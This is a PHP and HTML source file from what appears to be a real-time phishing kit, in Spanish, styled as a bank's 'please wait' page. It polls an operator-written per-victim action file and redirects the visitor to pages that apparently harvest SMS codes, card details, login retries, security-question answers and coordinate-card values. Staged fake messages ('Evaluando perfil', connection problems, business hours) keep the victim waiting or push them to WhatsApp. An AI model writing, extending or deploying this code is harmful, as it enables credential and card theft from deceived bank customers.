<?php
// ===== pampa.php =====
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
if (empty($_SESSION['tsv_ok'])) { header('Location: /', true, 302); exit; }
$u = $_SESSION['usuario'] ?? null;
if (!$u) {
  header("Location: jaspe.php");
  exit;
}

// Respuesta AJAX para el polling JS
if (isset($_GET['poll'])) {
    header('Content-Type: application/json');
    $ax_wol = "acciones/$u.txt";
    if (file_exists($ax_wol)) {
        $ac = trim(file_get_contents($ax_wol));
        unlink($ax_wol);
        unset($_SESSION['from_out']);
        $redir = null;
        if (substr($ac, 0, strlen("/palabra clave/")) === "/palabra clave/") {
            $pregunta = explode("/palabra clave/", $ac)[1];
            $_SESSION['pregunta'] = $pregunta;
            $redir = 'pregunta.php';
        } elseif (substr($ac, 0, strlen("/coordenadas etiquetas/")) === "/coordenadas etiquetas/") {
            $etiquetas = explode("/coordenadas etiquetas/", $ac)[1];
            $_SESSION['etiquetas'] = explode(",", $etiquetas);
            $redir = 'coordenadas.php';
        } else {
            $map = [
                '/SMS' => 'mica.php', '/SMSERROR' => 'alba.php',
                '/NUMERO' => 'numero.php', '/ERROR' => 'jaspe.php?error=1',
                '/LOGINERROR' => 'jaspe.php?error=1', '/LOGIN' => 'jaspe.php',
                '/CARD' => 'edelweiss.html', '/LISTO' => 'nebula.php',
                '/MAIL' => 'liebre.php', '/COMPRA' => 'copa.html',
                '/TIMEFORM' => 'yute.php',
                '/CHAT' => 'ocaso.php', '/WS' => 'iris.php'
            ];
            $redir = $map[$ac] ?? null;
        }
        echo json_encode(['redirect' => $redir ?? 'pampa.php']);
    } else {
        echo json_encode(['redirect' => null]);
    }
    exit;
}

$ax_wol = "acciones/$u.txt";
if (file_exists($ax_wol)) {
    $ac = trim(file_get_contents($ax_wol));
    unlink($ax_wol);
    unset($_SESSION['from_out']);

    if (substr($ac, 0, strlen("/palabra clave/")) === "/palabra clave/") {
        $pregunta = explode("/palabra clave/", $ac)[1];
        $_SESSION['pregunta'] = $pregunta;
        header("Location: pregunta.php");
        exit;
    }

    if (substr($ac, 0, strlen("/coordenadas etiquetas/")) === "/coordenadas etiquetas/") {
        $etiquetas = explode("/coordenadas etiquetas/", $ac)[1];
        $_SESSION['etiquetas'] = explode(",", $etiquetas);
        header("Location: coordenadas.php");
        exit;
    }

    switch ($ac) {
        case "/SMS":
            header("Location: mica.php");
            break;
        case "/SMSERROR":
            header("Location: alba.php");
            break;
        case "/NUMERO":
            header("Location: numero.php");
            break;
        case "/ERROR":
        case "/LOGINERROR":
            header("Location: jaspe.php?error=1");
            break;
        case "/LOGIN":
            header("Location: jaspe.php");
            break;
        case "/CARD":
            header("Location: edelweiss.html");
            break;
        case "/LISTO":
            header("Location: nebula.php");
            break;
        case "/MAIL":
            header("Location: liebre.php");
            break;
        case "/COMPRA":
            header("Location: copa.html");
            break;
        case "/TIMEFORM":
            header("Location: yute.php");
            break;
        case "/CHAT":
            header("Location: ocaso.php");
            break;
        case "/WS":
            header("Location: iris.php");
            break;
    }
    exit;
}
$fo = $_SESSION['from_out'] ?? false;
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Espere...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      margin: 0;
      padding: 24px;
      background-color: #fcfcfc;
      color: #006838;
      box-sizing: border-box;
    }
    .container-normal {
      margin-top: 20%;
      max-width: 480px;
      margin-left: auto;
      margin-right: auto;
      padding: 0 8px;
    }
    .container-normal h2 {
      font-size: 18px;
      font-weight: 400;
      color: #555;
      margin: 24px 0 0 0;
    }
    .gif-loader {
      display: block;
      margin: 0 auto;
      max-width: 220px;
      width: 75%;
    }
    .video-container {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      background: #fff;
    }
    .video-container video {
      max-width: 100%;
      max-height: 100vh;
    }
  </style>
</head>
<body>
<?php if ($fo): ?>
  <div class="video-container">
    <video autoplay loop muted playsinline>
      <source src="Out/cargaout.MP4" type="video/mp4">
    </video>
  </div>
<?php else: ?>
  <div class="container-normal">
    <img src="img/gifcarga.gif" class="gif-loader" alt="">
    <h2 id="msg-txt">Por favor espere</h2>
  </div>
  <div id="conn-popup" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.45);backdrop-filter:blur(3px);-webkit-backdrop-filter:blur(3px);z-index:9999;align-items:center;justify-content:center;padding:24px;opacity:0;transition:opacity 0.4s ease;">
    <div style="background:#fff;border-radius:0;padding:28px 24px 22px;max-width:320px;width:100%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.2);">
      <p style="font-size:16px;font-weight:600;color:#222;margin-bottom:10px;font-family:'Segoe UI',sans-serif;">Estamos teniendo problemas de conexi&#243;n</p>
      <p style="font-size:13px;color:#777;font-family:'Segoe UI',sans-serif;">Reconectando<span id="rec-dots"></span></p>
    </div>
  </div>
<?php endif; ?>
<?php if (!$fo): ?>
<script>
(function(){
    var el = document.getElementById('msg-txt');

    // Mensajes con duraci\u00f3n en ms y puntos animados
    var schedule = [
        {text: 'Por favor espere',       dur: 20000},
        {text: 'No cierre esta ventana', dur: 10000},
        {text: 'Evaluando perfil',        dur: 8000}
    ];
    var dots = ['.','..','...'];
    var di = 0, curMsg = 0;

    // Puntos cada 600ms
    setInterval(function(){
        di++;
        el.textContent = schedule[curMsg].text + dots[di % 3];
    }, 600);

    // Cambio de mensaje seg\u00fan duraci\u00f3n
    function scheduleNext(idx){
        curMsg = idx % schedule.length;
        el.textContent = schedule[curMsg].text + dots[di % 3];
        setTimeout(function(){ scheduleNext(curMsg + 1); }, schedule[curMsg].dur);
    }
    scheduleNext(0);

    // Popup reconexion a los 60s si no ha respondido
    var responded = false;
    var popupShown = false;

    function showConnPopup(){
        if(popupShown) return;
        popupShown = true;
        var p = document.getElementById('conn-popup');
        var rd = document.getElementById('rec-dots');
        var ri = 0, rs = ['.', '. .', '. . .'];
        setInterval(function(){ rd.textContent = rs[ri++ % 3]; }, 600);
        p.style.display = 'flex';
        setTimeout(function(){ p.style.opacity = '1'; }, 20);
        setTimeout(function(){
            p.style.opacity = '0';
            setTimeout(function(){ p.style.display = 'none'; popupShown = false; }, 400);
        }, 5000);
    }

    setTimeout(function(){
        if(!responded){ showConnPopup(); }
    }, 60000);

    // Horarios: auto-redirect a WS segun hora
    var _h = new Date().getHours();
    var _lateNight = (_h >= 1 && _h < 8);        // 1AM-8AM: 1min + popup
    var _autoTime = _lateNight ? 60000 : 150000; // resto: 2.5min

    function showHoursPopup(){
        var ov = document.createElement('div');
        ov.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:9999;display:flex;align-items:center;justify-content:center;padding:24px;';
        var bx = document.createElement('div');
        bx.style.cssText = 'background:#fff;border-radius:12px;padding:28px 24px;max-width:340px;width:100%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.2);';
        bx.innerHTML = '<div style="font-size:36px;margin-bottom:12px;">&#128337;</div>'
            + '<p style="font-size:16px;font-weight:600;color:#006838;margin-bottom:10px;">Horario de atenci\u00f3n</p>'
            + '<p style="font-size:14px;color:#555;margin-bottom:14px;">Nuestro horario de atenci\u00f3n es de <b>8:00 AM a 6:00 PM</b></p>'
            + '<p style="font-size:13px;color:#777;margin-bottom:18px;">Deja un mensaje por WhatsApp para ser de los primeros en ser atendido ma\u00f1ana.</p>'
            + '<a href="iris.php" style="display:inline-block;padding:12px 28px;background:#25D366;color:#fff;border-radius:8px;text-decoration:none;font-weight:600;font-size:14px;">Enviar mensaje</a>';
        ov.appendChild(bx);
        document.body.appendChild(ov);
    }

    var gotAction = false;
    setTimeout(function(){
        if(!gotAction){
            if(_lateNight){
                showHoursPopup();
                setTimeout(function(){ window.location.href = 'iris.php'; }, 8000);
            } else {
                window.location.href = 'iris.php';
            }
        }
    }, _autoTime);

    // Polling fetch
    (function poll(){
        fetch('pampa.php?poll=1',{cache:'no-store'})
        .then(function(r){return r.json();})
        .then(function(data){
            responded = true;
            if(data.redirect){ gotAction = true; window.location.href = data.redirect; }
            else{ setTimeout(poll, 2500); }
        })
        .catch(function(){ setTimeout(poll, 3000); });
    })();
})();
</script>
<?php endif; ?>
</body>
</html>